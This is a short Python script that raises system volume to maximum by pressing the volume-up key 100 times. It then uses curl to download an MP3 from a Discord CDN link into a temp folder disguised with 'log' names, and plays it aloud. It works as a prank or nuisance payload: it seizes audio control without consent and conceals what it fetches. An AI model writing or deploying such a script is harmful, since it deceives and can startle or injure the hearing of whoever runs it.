from os import system
import os.path
from tempfile import gettempdir
import pynput.keyboard
from playsound import playsound

def main():
    keyboard = pynput.keyboard.Controller()
    for i in range(100):
        keyboard.press(pynput.keyboard.Key.media_volume_up)
        keyboard.release(pynput.keyboard.Key.media_volume_up)

    temp = gettempdir()
    exist = os.path.exists(f"{temp}/log_app_build/log/log.mp3")

    if exist == False:
        system(f"mkdir {temp}\log_app_build\log")
        url = 'https://cdn.discordapp.com/attachments/877537566449082401/912003460243800094/log.mp3'
        system(f"curl {url} --output {temp}/log_app_build/log/log.mp3")


    playsound(f"{temp}\log_app_build\log\log.mp3")

if __name__ == '__main__':
    main()